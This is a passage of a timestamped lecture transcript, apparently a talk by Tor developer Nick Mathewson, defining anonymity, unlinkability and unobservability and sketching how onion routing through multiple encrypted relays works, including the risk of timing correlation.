              <time_slice>8:32</time_slice>
              <text_slice>These notions come out
of a terminology paper</text_slice>
            </slice>
            <slice>
              <time_slice>8:35</time_slice>
              <text_slice>by [INAUDIBLE] that
you find a link</text_slice>
            </slice>
            <slice>
              <time_slice>8:38</time_slice>
              <text_slice>to on freehaven.net/anonbib/,
the anonymity bibliography that</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>I help maintain.</text_slice>
            </slice>
            <slice>
              <time_slice>8:46</time_slice>
              <text_slice>It should list most of the
good papers in the field.</text_slice>
            </slice>
            <slice>
              <time_slice>8:49</time_slice>
              <text_slice>We need to bring it
up to date to 2014,</text_slice>
            </slice>
            <slice>
              <time_slice>8:51</time_slice>
              <text_slice>but it's pretty useful.</text_slice>
            </slice>
            <slice>
              <time_slice>8:53</time_slice>
              <text_slice>So when I say anonymity,
generally what I mean</text_slice>
            </slice>
            <slice>
              <time_slice>8:55</time_slice>
              <text_slice>is Alice is doing some activity.</text_slice>
            </slice>
            <slice>
              <time_slice>9:01</time_slice>
              <text_slice>She's-- what should
Alice be doing?</text_slice>
            </slice>
            <slice>
              <time_slice>9:05</time_slice>
              <text_slice>Alice is buying new socks.</text_slice>
            </slice>
            <slice>
              <time_slice>9:10</time_slice>
              <text_slice>And there's some attacker here.</text_slice>
            </slice>
            <slice>
              <time_slice>9:11</time_slice>
              <text_slice>Let's call her Eve for now.</text_slice>
            </slice>
            <slice>
              <time_slice>9:14</time_slice>
              <text_slice>Eve can tell that Alice
is doing something.</text_slice>
            </slice>
            <slice>
              <time_slice>9:18</time_slice>
              <text_slice>Preventing that is not
what we mean by anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>9:21</time_slice>
              <text_slice>That's called unobservability.</text_slice>
            </slice>
            <slice>
              <time_slice>9:22</time_slice>
              <text_slice>Eve can tell possibly that
someone is buying socks.</text_slice>
            </slice>
            <slice>
              <time_slice>9:26</time_slice>
              <text_slice>Again, that's not what
we mean by anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>9:28</time_slice>
              <text_slice>But what we hope is that
Eve cannot tell that Alice</text_slice>
            </slice>
            <slice>
              <time_slice>9:33</time_slice>
              <text_slice>in particular is buying socks.</text_slice>
            </slice>
            <slice>
              <time_slice>9:36</time_slice>
              <text_slice>And we mean that both
on a categorical level--</text_slice>
            </slice>
            <slice>
              <time_slice>9:40</time_slice>
              <text_slice>Eve should not be
able to conclude</text_slice>
            </slice>
            <slice>
              <time_slice>9:42</time_slice>
              <text_slice>through rigorous mathematical
proof, this is Alice,</text_slice>
            </slice>
            <slice>
              <time_slice>9:45</time_slice>
              <text_slice>she's buying socks--
but also, Eve should not</text_slice>
            </slice>
            <slice>
              <time_slice>9:48</time_slice>
              <text_slice>be able to conclude
probabilistically it's likelier</text_slice>
            </slice>
            <slice>
              <time_slice>9:52</time_slice>
              <text_slice>that Alice is buying socks than
some randomly selected person.</text_slice>
            </slice>
            <slice>
              <time_slice>9:56</time_slice>
              <text_slice>And also, we would
like Eve not to be</text_slice>
            </slice>
            <slice>
              <time_slice>9:59</time_slice>
              <text_slice>able to conclude after
observing many Alice activities,</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>Alice sometimes buys
socks, even if I</text_slice>
            </slice>
            <slice>
              <time_slice>10:05</time_slice>
              <text_slice>don't know some particular
activity of Alice's is</text_slice>
            </slice>
            <slice>
              <time_slice>10:08</time_slice>
              <text_slice>a socks purchase.</text_slice>
            </slice>
            <slice>
              <time_slice>10:12</time_slice>
              <text_slice>There are other ideas
that are related.</text_slice>
            </slice>
            <slice>
              <time_slice>10:14</time_slice>
              <text_slice>One is on unlinkability.</text_slice>
            </slice>
            <slice>
              <time_slice>10:17</time_slice>
              <text_slice>Unlinkability is it's like a
long-term profile of Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>10:23</time_slice>
              <text_slice>So for instance,
Alice has been posting</text_slice>
            </slice>
            <slice>
              <time_slice>10:26</time_slice>
              <text_slice>as-- I'm never good at
picking names for my example.</text_slice>
            </slice>
            <slice>
              <time_slice>10:33</time_slice>
              <text_slice>Alice has been posting as Bob
and writing a political blog</text_slice>
            </slice>
            <slice>
              <time_slice>10:39</time_slice>
              <text_slice>that would disrupt
her career, that</text_slice>
            </slice>
            <slice>
              <time_slice>10:43</time_slice>
              <text_slice>would offend her
department head and disrupt</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>her career as a computer
security [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>10:49</time_slice>
              <text_slice>So she's been writing as Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>10:53</time_slice>
              <text_slice>Unlinkability is Eve's
inability to link Alice</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>to a particular profile.</text_slice>
            </slice>
            <slice>
              <time_slice>11:01</time_slice>
              <text_slice>Final notion--
unobservability, some systems</text_slice>
            </slice>
            <slice>
              <time_slice>11:05</time_slice>
              <text_slice>try to make it impossible to
even tell that Alice is online,</text_slice>
            </slice>
            <slice>
              <time_slice>11:12</time_slice>
              <text_slice>that Alice is connecting to
anybody at all, that Alice</text_slice>
            </slice>
            <slice>
              <time_slice>11:15</time_slice>
              <text_slice>is doing any active.</text_slice>
            </slice>
            <slice>
              <time_slice>11:17</time_slice>
              <text_slice>These are rather hard to build.</text_slice>
            </slice>
            <slice>
              <time_slice>11:20</time_slice>
              <text_slice>I'll talk a little bit
more about to what extent</text_slice>
            </slice>
            <slice>
              <time_slice>11:22</time_slice>
              <text_slice>that they are useful later.</text_slice>
            </slice>
            <slice>
              <time_slice>11:25</time_slice>
              <text_slice>Something that is
useful in that area</text_slice>
            </slice>
            <slice>
              <time_slice>11:27</time_slice>
              <text_slice>is you might want to
conceal that Alice</text_slice>
            </slice>
            <slice>
              <time_slice>11:29</time_slice>
              <text_slice>is using an anonymity
system, but not</text_slice>
            </slice>
            <slice>
              <time_slice>11:32</time_slice>
              <text_slice>that she is on the internet.</text_slice>
            </slice>
            <slice>
              <time_slice>11:33</time_slice>
              <text_slice>That's more achievable
than concealing the fact</text_slice>
            </slice>
            <slice>
              <time_slice>11:35</time_slice>
              <text_slice>that Alice is on the
internet entirely.</text_slice>
            </slice>
            <slice>
              <time_slice>11:39</time_slice>
              <text_slice>So why did I start working
on this in the first place?</text_slice>
            </slice>
            <slice>
              <time_slice>11:42</time_slice>
              <text_slice>Well, partially because
of the engineer's itch.</text_slice>
            </slice>
            <slice>
              <time_slice>11:45</time_slice>
              <text_slice>It's a cool problem.</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>It's an interesting problem.</text_slice>
            </slice>
            <slice>
              <time_slice>11:47</time_slice>
              <text_slice>Nobody else was
actually working on it.</text_slice>
            </slice>
            <slice>
              <time_slice>11:50</time_slice>
              <text_slice>And my friend Roger
got a contract</text_slice>
            </slice>
            <slice>
              <time_slice>11:52</time_slice>
              <text_slice>to finish up a stalled
research project</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>before the grant expired.</text_slice>
            </slice>
            <slice>
              <time_slice>11:58</time_slice>
              <text_slice>And he did it well enough that
I said, hey, I'll join up.</text_slice>
            </slice>
            <slice>
              <time_slice>12:03</time_slice>
              <text_slice>And [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>12:05</time_slice>
              <text_slice>I'll join in.</text_slice>
            </slice>
            <slice>
              <time_slice>12:06</time_slice>
              <text_slice>After a while, we
formed a nonprofit</text_slice>
            </slice>
            <slice>
              <time_slice>12:09</time_slice>
              <text_slice>and released everything
as open source.</text_slice>
            </slice>
            <slice>
              <time_slice>12:13</time_slice>
              <text_slice>So that's part of it.</text_slice>
            </slice>
            <slice>
              <time_slice>12:14</time_slice>
              <text_slice>But for deeper
motivations, I think</text_slice>
            </slice>
            <slice>
              <time_slice>12:18</time_slice>
              <text_slice>humanity has got a lot
of problems that can only</text_slice>
            </slice>
            <slice>
              <time_slice>12:21</time_slice>
              <text_slice>be solved through better
and more dedicated</text_slice>
            </slice>
            <slice>
              <time_slice>12:25</time_slice>
              <text_slice>communication, freer expression,
and more freedom of thought.</text_slice>
            </slice>
            <slice>
              <time_slice>12:30</time_slice>
              <text_slice>And I don't know how to
solve these problems.</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>All I think I can do
is try to make sure</text_slice>
            </slice>
            <slice>
              <time_slice>12:37</time_slice>
              <text_slice>that what I see as
inhibiting discussion,</text_slice>
            </slice>
            <slice>
              <time_slice>12:40</time_slice>
              <text_slice>thought, speech,
becomes harder to do.</text_slice>
            </slice>
            <slice>
              <time_slice>12:44</time_slice>
              <text_slice>So that's [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>12:47</time_slice>
              <text_slice>STUDENT: So I know there are
many good reasons to use Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>12:49</time_slice>
              <text_slice>Please don't see
this as criticism.</text_slice>
            </slice>
            <slice>
              <time_slice>12:51</time_slice>
              <text_slice>I'm just curious,
what is your opinion</text_slice>
            </slice>
            <slice>
              <time_slice>12:53</time_slice>
              <text_slice>as far as criminal activity?</text_slice>
            </slice>
            <slice>
              <time_slice>12:55</time_slice>
              <text_slice>NICK MATHEWSON: What is my
opinion on criminal activity?</text_slice>
            </slice>
            <slice>
              <time_slice>12:57</time_slice>
              <text_slice>Some laws are good.</text_slice>
            </slice>
            <slice>
              <time_slice>12:58</time_slice>
              <text_slice>Some laws are bad.</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>My lawyers would tell me
never to advise anyone</text_slice>
            </slice>
            <slice>
              <time_slice>13:01</time_slice>
              <text_slice>to break the law.</text_slice>
            </slice>
            <slice>
              <time_slice>13:05</time_slice>
              <text_slice>My goal was not to enable
criminal activity against most</text_slice>
            </slice>
            <slice>
              <time_slice>13:08</time_slice>
              <text_slice>of the laws I agree with.</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>In places where criticising
the government is illegal,</text_slice>
            </slice>
            <slice>
              <time_slice>13:13</time_slice>
              <text_slice>then I'm in favor of criminal
activity of that kind.</text_slice>
            </slice>
            <slice>
              <time_slice>13:17</time_slice>
              <text_slice>So in that case, I
suppose I was supporting</text_slice>
            </slice>
            <slice>
              <time_slice>13:19</time_slice>
              <text_slice>that kind of criminal activity.</text_slice>
            </slice>
            <slice>
              <time_slice>13:21</time_slice>
              <text_slice>My stance on whether it's
a problem that an anonymity</text_slice>
            </slice>
            <slice>
              <time_slice>13:24</time_slice>
              <text_slice>network gets used
for criminal activity</text_slice>
            </slice>
            <slice>
              <time_slice>13:26</time_slice>
              <text_slice>in general, to the extent
that there are good laws,</text_slice>
            </slice>
            <slice>
              <time_slice>13:29</time_slice>
              <text_slice>I would prefer that
people not break them.</text_slice>
            </slice>
            <slice>
              <time_slice>13:31</time_slice>
              <text_slice>I would, however, think that any
computer security system that</text_slice>
            </slice>
            <slice>
              <time_slice>13:36</time_slice>
              <text_slice>does not get used by criminals
is probably a very bad computer</text_slice>
            </slice>
            <slice>
              <time_slice>13:40</time_slice>
              <text_slice>security system if
the criminals are</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>making any kind of good
decision making policy.</text_slice>
            </slice>
            <slice>
              <time_slice>13:46</time_slice>
              <text_slice>I think that if we go
around banning security</text_slice>
            </slice>
            <slice>
              <time_slice>13:49</time_slice>
              <text_slice>that works for criminals, we
wind up with insecure systems.</text_slice>
            </slice>
            <slice>
              <time_slice>13:54</time_slice>
              <text_slice>So that's more or less
where I stand on it.</text_slice>
            </slice>
            <slice>
              <time_slice>13:56</time_slice>
              <text_slice>I'm not really the
philosopher of it, though.</text_slice>
            </slice>
            <slice>
              <time_slice>13:58</time_slice>
              <text_slice>I'm more of the programmer.</text_slice>
            </slice>
            <slice>
              <time_slice>13:59</time_slice>
              <text_slice>So I'm going to be giving
really trite answers</text_slice>
            </slice>
            <slice>
              <time_slice>14:01</time_slice>
              <text_slice>to philosophical
and legal questions.</text_slice>
            </slice>
            <slice>
              <time_slice>14:03</time_slice>
              <text_slice>Also, I'm not a lawyer and
cannot offer legal advice.</text_slice>
            </slice>
            <slice>
              <time_slice>14:05</time_slice>
              <text_slice>Do not take anything
I say as legal advice.</text_slice>
            </slice>
            <slice>
              <time_slice>14:08</time_slice>
              <text_slice>That said, [INAUDIBLE], a lot
of these research problems</text_slice>
            </slice>
            <slice>
              <time_slice>14:14</time_slice>
              <text_slice>that I'm going to
be talking about</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>weren't even close
to being solved.</text_slice>
            </slice>
            <slice>
              <time_slice>14:17</time_slice>
              <text_slice>So whey do we start anyway
instead of going straight</text_slice>
            </slice>
            <slice>
              <time_slice>14:19</time_slice>
              <text_slice>into research?</text_slice>
            </slice>
            <slice>
              <time_slice>14:21</time_slice>
              <text_slice>One of the reasons, we
thought that a lot of them</text_slice>
            </slice>
            <slice>
              <time_slice>14:23</time_slice>
              <text_slice>wouldn't get solved unless
there was a test bed to work on.</text_slice>
            </slice>
            <slice>
              <time_slice>14:27</time_slice>
              <text_slice>And that's kind
of been borne out.</text_slice>
            </slice>
            <slice>
              <time_slice>14:29</time_slice>
              <text_slice>Because Tor has kind of become
the research platform of choice</text_slice>
            </slice>
            <slice>
              <time_slice>14:33</time_slice>
              <text_slice>for lots of work on low
latency anonymity systems.</text_slice>
            </slice>
            <slice>
              <time_slice>14:36</time_slice>
              <text_slice>And it's helped the
field a lot in that way.</text_slice>
            </slice>
            <slice>
              <time_slice>14:38</time_slice>
              <text_slice>But also, 10 years on, a
lot of the big problems</text_slice>
            </slice>
            <slice>
              <time_slice>14:41</time_slice>
              <text_slice>still aren't solved.</text_slice>
            </slice>
            <slice>
              <time_slice>14:42</time_slice>
              <text_slice>So if we had waited 10 years
for everything to get fixed,</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>we would have been
waiting in vain.</text_slice>
            </slice>
            <slice>
              <time_slice>14:48</time_slice>
              <text_slice>So why do it then?</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>Partially because we thought
that having a system out there</text_slice>
            </slice>
            <slice>
              <time_slice>14:58</time_slice>
              <text_slice>would improve long-term
outcomes for the world.</text_slice>
            </slice>
            <slice>
              <time_slice>15:03</time_slice>
              <text_slice>That is, it's really easy
to argue that something that</text_slice>
            </slice>
            <slice>
              <time_slice>15:05</time_slice>
              <text_slice>doesn't exist should be banned.</text_slice>
            </slice>
            <slice>
              <time_slice>15:08</time_slice>
              <text_slice>Arguments against civilian
use of cryptography</text_slice>
            </slice>
            <slice>
              <time_slice>15:10</time_slice>
              <text_slice>were much easier to
make in public in 1990</text_slice>
            </slice>
            <slice>
              <time_slice>15:13</time_slice>
              <text_slice>than they are today.</text_slice>
            </slice>
            <slice>
              <time_slice>15:14</time_slice>
              <text_slice>Because there was
almost no civilian</text_slice>
            </slice>
            <slice>
              <time_slice>15:15</time_slice>
              <text_slice>use of strong cryptography then.</text_slice>
            </slice>
            <slice>
              <time_slice>15:18</time_slice>
              <text_slice>And you could argue that if
anything stronger than DES</text_slice>
            </slice>
            <slice>
              <time_slice>15:23</time_slice>
              <text_slice>is legal, then
civilization will collapse.</text_slice>
            </slice>
            <slice>
              <time_slice>15:28</time_slice>
              <text_slice>Criminals will never be
caught, and organized crime</text_slice>
            </slice>
            <slice>
              <time_slice>15:34</time_slice>
              <text_slice>will take over everything.</text_slice>
            </slice>
            <slice>
              <time_slice>15:36</time_slice>
              <text_slice>But you couldn't
really argue that that</text_slice>
            </slice>
            <slice>
              <time_slice>15:38</time_slice>
              <text_slice>was the inevitable consequence
of cryptography in 2000.</text_slice>
            </slice>
            <slice>
              <time_slice>15:41</time_slice>
              <text_slice>Because cryptography had
already been out there,</text_slice>
            </slice>
            <slice>
              <time_slice>15:43</time_slice>
              <text_slice>and it turned out
not to end the world.</text_slice>
            </slice>
            <slice>
              <time_slice>15:46</time_slice>
              <text_slice>Further, it was harder to argue
for a cryptography ban in 2000</text_slice>
            </slice>
            <slice>
              <time_slice>15:49</time_slice>
              <text_slice>because there was a large
constituency in favor</text_slice>
            </slice>
            <slice>
              <time_slice>15:54</time_slice>
              <text_slice>of the use of cryptography.</text_slice>
            </slice>
            <slice>
              <time_slice>15:56</time_slice>
              <text_slice>That is, if someone
in 1985 says,</text_slice>
            </slice>
            <slice>
              <time_slice>15:59</time_slice>
              <text_slice>let's ban strong
cryptography, well, banks</text_slice>
            </slice>
            <slice>
              <time_slice>16:01</time_slice>
              <text_slice>are using strong cryptography.</text_slice>
            </slice>
            <slice>
              <time_slice>16:02</time_slice>
              <text_slice>So they'll ask for an exemption.</text_slice>
            </slice>
            <slice>
              <time_slice>16:04</time_slice>
              <text_slice>But other than
that, there weren't</text_slice>
            </slice>
            <slice>
              <time_slice>16:05</time_slice>
              <text_slice>a lot of users of
strong cryptography</text_slice>
            </slice>
            <slice>
              <time_slice>16:07</time_slice>
              <text_slice>in the civilian space.</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>But if someone in
2000 said, let's</text_slice>
            </slice>
            <slice>
              <time_slice>16:09</time_slice>
              <text_slice>ban strong
cryptography, that would</text_slice>
            </slice>
            <slice>
              <time_slice>16:12</time_slice>
              <text_slice>be every internet company.</text_slice>
            </slice>
            <slice>
              <time_slice>16:14</time_slice>
              <text_slice>Everyone running an HTTPS page
would start waving their hands</text_slice>
            </slice>
            <slice>
              <time_slice>16:18</time_slice>
              <text_slice>and shouting about it.</text_slice>
            </slice>
            <slice>
              <time_slice>16:20</time_slice>
              <text_slice>And nowadays, strong
cryptography bans</text_slice>
            </slice>
            <slice>
              <time_slice>16:21</time_slice>
              <text_slice>are probably unfeasible,
although people</text_slice>
            </slice>
            <slice>
              <time_slice>16:24</time_slice>
              <text_slice>keep bringing back the idea.</text_slice>
            </slice>
            <slice>
              <time_slice>16:26</time_slice>
              <text_slice>And again, I'm not
the philosopher</text_slice>
            </slice>
            <slice>
              <time_slice>16:27</time_slice>
              <text_slice>or political scientist
of the movement.</text_slice>
            </slice>
            <slice>
              <time_slice>16:29</time_slice>
              <text_slice>So some folks ask me,
what's your threat model?</text_slice>
            </slice>
            <slice>
              <time_slice>16:34</time_slice>
              <text_slice>It's good to be thinking
in terms of threat models.</text_slice>
            </slice>
            <slice>
              <time_slice>16:37</time_slice>
              <text_slice>Unfortunately, our threat
model is kind of weird.</text_slice>
            </slice>
            <slice>
              <time_slice>16:40</time_slice>
              <text_slice>We started not with an
adversary requirement.</text_slice>
            </slice>
            <slice>
              <time_slice>16:43</time_slice>
              <text_slice>But we started with a
usability requirement.</text_slice>
            </slice>
            <slice>
              <time_slice>16:46</time_slice>
              <text_slice>The usability requirement
we gave ourselves to begin</text_slice>
            </slice>
            <slice>
              <time_slice>16:48</time_slice>
              <text_slice>is, this has to be
useful for web browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>16:52</time_slice>
              <text_slice>This has to be useful for
interactive protocols.</text_slice>
            </slice>
            <slice>
              <time_slice>16:58</time_slice>
              <text_slice>And it actually
needs to see use.</text_slice>
            </slice>
            <slice>
              <time_slice>17:01</time_slice>
              <text_slice>Subject to that, we want
to maximize security.</text_slice>
            </slice>
            <slice>
              <time_slice>17:04</time_slice>
              <text_slice>So our threat model has
lots of weird corners</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>in it if you actually
write it out as,</text_slice>
            </slice>
            <slice>
              <time_slice>17:10</time_slice>
              <text_slice>what can an attacker do, under
what circumstances, and how?</text_slice>
            </slice>
            <slice>
              <time_slice>17:13</time_slice>
              <text_slice>And that's because we've
set ourselves the goal of,</text_slice>
            </slice>
            <slice>
              <time_slice>17:15</time_slice>
              <text_slice>it has to work for the web.</text_slice>
            </slice>
            <slice>
              <time_slice>17:17</time_slice>
              <text_slice>And I'll return to that
in a minute or two.</text_slice>
            </slice>
            <slice>
              <time_slice>17:20</time_slice>
              <text_slice>But let's sort of
talk about now how</text_slice>
            </slice>
            <slice>
              <time_slice>17:23</time_slice>
              <text_slice>we can use forward anonymity,
how we build forward anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>17:29</time_slice>
              <text_slice>So here's Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>17:32</time_slice>
              <text_slice>She wants to buy socks.</text_slice>
            </slice>
            <slice>
              <time_slice>17:35</time_slice>
              <text_slice>So OK, let's say that
Alice runs a computer.</text_slice>
            </slice>
            <slice>
              <time_slice>17:42</time_slice>
              <text_slice>Let's call it R for relay.</text_slice>
            </slice>
            <slice>
              <time_slice>17:43</time_slice>
              <text_slice>And this computer relays
her traffic to-- I</text_slice>
            </slice>
            <slice>
              <time_slice>17:47</time_slice>
              <text_slice>want to say socks.com,
but I'm afraid that'll</text_slice>
            </slice>
            <slice>
              <time_slice>17:50</time_slice>
              <text_slice>turn out to be something
horrible, so zappos.com.</text_slice>
            </slice>
            <slice>
              <time_slice>17:53</time_slice>
              <text_slice>Yeah, they sell socks, too.</text_slice>
            </slice>
            <slice>
              <time_slice>17:55</time_slice>
              <text_slice>All right, so Alice wants to
buy some socks from zappos.com.</text_slice>
            </slice>
            <slice>
              <time_slice>17:58</time_slice>
              <text_slice>And she's going through a relay.</text_slice>
            </slice>
            <slice>
              <time_slice>18:00</time_slice>
              <text_slice>Well, I said Alice runs a relay.</text_slice>
            </slice>
            <slice>
              <time_slice>18:04</time_slice>
              <text_slice>Any eavesdropper who's
looking at this will say,</text_slice>
            </slice>
            <slice>
              <time_slice>18:07</time_slice>
              <text_slice>that's Alice's computer.</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>It's probably Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>18:11</time_slice>
              <text_slice>All right, so let's have
somebody else run a relay</text_slice>
            </slice>
            <slice>
              <time_slice>18:13</time_slice>
              <text_slice>and have lots of other
users all visit it.</text_slice>
            </slice>
            <slice>
              <time_slice>18:17</time_slice>
              <text_slice>I'll call them A2
and A3, because there</text_slice>
            </slice>
            <slice>
              <time_slice>18:20</time_slice>
              <text_slice>aren't enough standard
cryptography person names-- buy</text_slice>
            </slice>
            <slice>
              <time_slice>18:26</time_slice>
              <text_slice>books, tweet cat pictures.</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>This is like 80% of what people
do on the internet, right?</text_slice>
            </slice>
            <slice>
              <time_slice>18:42</time_slice>
              <text_slice>So now we have three people all
going into this relay, three</text_slice>
            </slice>
            <slice>
              <time_slice>18:46</time_slice>
              <text_slice>streams exiting.</text_slice>
            </slice>
            <slice>
              <time_slice>18:47</time_slice>
              <text_slice>Someone who's watching the
relay can't easily correlate--</text_slice>
            </slice>
            <slice>
              <time_slice>18:51</time_slice>
              <text_slice>should not be, we hope, but
we return to that later--</text_slice>
            </slice>
            <slice>
              <time_slice>18:54</time_slice>
              <text_slice>that this Alice is buying
socks, this Alice, buying books,</text_slice>
            </slice>
            <slice>
              <time_slice>18:58</time_slice>
              <text_slice>this Alice is tweeting cat pix.</text_slice>
            </slice>
            <slice>
              <time_slice>19:00</time_slice>
              <text_slice>Well, except if they're watching
this side of the connections,</text_slice>
            </slice>
            <slice>
              <time_slice>19:06</time_slice>
              <text_slice>they can see Alice
telling the relay,</text_slice>
            </slice>
            <slice>
              <time_slice>19:08</time_slice>
              <text_slice>please connect me to zappos.com.</text_slice>
            </slice>
            <slice>
              <time_slice>19:10</time_slice>
              <text_slice>All right, so we'll
add some encryption.</text_slice>
            </slice>
            <slice>
              <time_slice>19:12</time_slice>
              <text_slice>We'll maybe do TLS on
all of these links.</text_slice>
            </slice>
            <slice>
              <time_slice>19:15</time_slice>
              <text_slice>So to the extent that you
can't break TLS, to the extent</text_slice>
            </slice>
            <slice>
              <time_slice>19:18</time_slice>
              <text_slice>you can't correlate
this to this,</text_slice>
            </slice>
            <slice>
              <time_slice>19:20</time_slice>
              <text_slice>then they get some privacy.</text_slice>
            </slice>
            <slice>
              <time_slice>19:22</time_slice>
              <text_slice>Well, that's still not
good enough, though.</text_slice>
            </slice>
            <slice>
              <time_slice>19:25</time_slice>
              <text_slice>Because first off, we're
assuming that this relay</text_slice>
            </slice>
            <slice>
              <time_slice>19:31</time_slice>
              <text_slice>is fully trusted.</text_slice>
            </slice>
            <slice>
              <time_slice>19:32</time_slice>
              <text_slice>I assume you know the
definition of trusted</text_slice>
            </slice>
            <slice>
              <time_slice>19:34</time_slice>
              <text_slice>and why it doesn't
actually mean trusted.</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>OK, good.</text_slice>
            </slice>
            <slice>
              <time_slice>19:37</time_slice>
              <text_slice>This is trusted in
the sense that it</text_slice>
            </slice>
            <slice>
              <time_slice>19:39</time_slice>
              <text_slice>can break the whole system,
trusted in the sense</text_slice>
            </slice>
            <slice>
              <time_slice>19:41</time_slice>
              <text_slice>that you can't help but trust
it, not trusted in the sense</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>that it's actually trustworthy.</text_slice>
            </slice>
            <slice>
              <time_slice>19:46</time_slice>
              <text_slice>So all right, we can
introduce multiple relays.</text_slice>
            </slice>
            <slice>
              <time_slice>19:49</time_slice>
              <text_slice>We can have different relays
run by different people.</text_slice>
            </slice>
            <slice>
              <time_slice>19:53</time_slice>
              <text_slice>We can have-- this is not
actually the topology we use.</text_slice>
            </slice>
            <slice>
              <time_slice>20:00</time_slice>
              <text_slice>But my blackboard
technique is terrible,</text_slice>
            </slice>
            <slice>
              <time_slice>20:01</time_slice>
              <text_slice>and I don't want
to redraw anything.</text_slice>
            </slice>
            <slice>
              <time_slice>20:07</time_slice>
              <text_slice>We can imagine tumbling
these connections</text_slice>
            </slice>
            <slice>
              <time_slice>20:09</time_slice>
              <text_slice>through multiple
relays, each of which</text_slice>
            </slice>
            <slice>
              <time_slice>20:11</time_slice>
              <text_slice>removes a single
layer of encryption.</text_slice>
            </slice>
            <slice>
              <time_slice>20:14</time_slice>
              <text_slice>So all this relay sees is
Alice is doing something.</text_slice>
            </slice>
            <slice>
              <time_slice>20:19</time_slice>
              <text_slice>All this relay sees is
someone is buying socks.</text_slice>
            </slice>
            <slice>
              <time_slice>20:23</time_slice>
              <text_slice>But this one just sees
someone is buying socks.</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>The connection came
from this relay.</text_slice>
            </slice>
            <slice>
              <time_slice>20:28</time_slice>
              <text_slice>This one just sees Alice
is doing something,</text_slice>
            </slice>
            <slice>
              <time_slice>20:30</time_slice>
              <text_slice>and it forwards onto this relay.</text_slice>
            </slice>
            <slice>
              <time_slice>20:32</time_slice>
              <text_slice>And no single party ought
to be able to correlate</text_slice>
            </slice>
            <slice>
              <time_slice>20:35</time_slice>
              <text_slice>the whole thing.</text_slice>
            </slice>
            <slice>
              <time_slice>20:37</time_slice>
              <text_slice>Now we come to a
major design point.</text_slice>
            </slice>
            <slice>
              <time_slice>20:42</time_slice>
              <text_slice>Let's suppose that Eve is
watching here and here.</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>Nothing I've said
so far does anything</text_slice>
            </slice>
            <slice>
              <time_slice>20:52</time_slice>
              <text_slice>to obscure the timing and
volume of Alice's packets.</text_slice>
            </slice>
            <slice>
              <time_slice>20:57</time_slice>
              <text_slice>Oh sure, there'll be
some trivial noise</text_slice>
            </slice>
            <slice>
              <time_slice>21:01</time_slice>
              <text_slice>added from all the
computation and decryption</text_slice>
            </slice>
            <slice>
              <time_slice>21:03</time_slice>
              <text_slice>these things do from
network latency and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>21:06</time_slice>
              <text_slice>But ultimately, if Alice
is sending a kilobyte in,</text_slice>
            </slice>
            <slice>
              <time_slice>21:11</time_slice>
              <text_slice>then the design I've
sketched out so far,</text_slice>
            </slice>
            <slice>
              <time_slice>21:13</time_slice>
              <text_slice>a kilobyte is coming out.</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>And if the socks web
page is 64k long,</text_slice>
            </slice>
            <slice>
              <time_slice>21:21</time_slice>
              <text_slice>and is served by this
web server at 11:26,</text_slice>
            </slice>
            <slice>
              <time_slice>21:26</time_slice>
              <text_slice>then Alice is going
to get something</text_slice>
            </slice>
            <slice>
              <time_slice>21:27</time_slice>
              <text_slice>about 64k long at
11:26 or 11:27 or so.</text_slice>
            </slice>
            <slice>
              <time_slice>21:33</time_slice>
              <text_slice>Now, with some
statistics, Eve can</text_slice>
            </slice>
            <slice>
              <time_slice>21:38</time_slice>
              <text_slice>correlate some of these
streams if we don't obscure</text_slice>
            </slice>
            <slice>
              <time_slice>21:42</time_slice>
              <text_slice>volume and timing information.</text_slice>
            </slice>
            <slice>
              <time_slice>21:44</time_slice>
              <text_slice>There are designs that do
obscure volume and timing</text_slice>
            </slice>
            <slice>
              <time_slice>21:46</time_slice>
              <text_slice>information.</text_slice>
            </slice>
            <slice>
              <time_slice>21:48</time_slice>
              <text_slice>The good ones usually
come out of [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>21:52</time_slice>
              <text_slice>although there's
some work on DC-nets.</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>You could have something
where each of these nodes</text_slice>
            </slice>
            <slice>
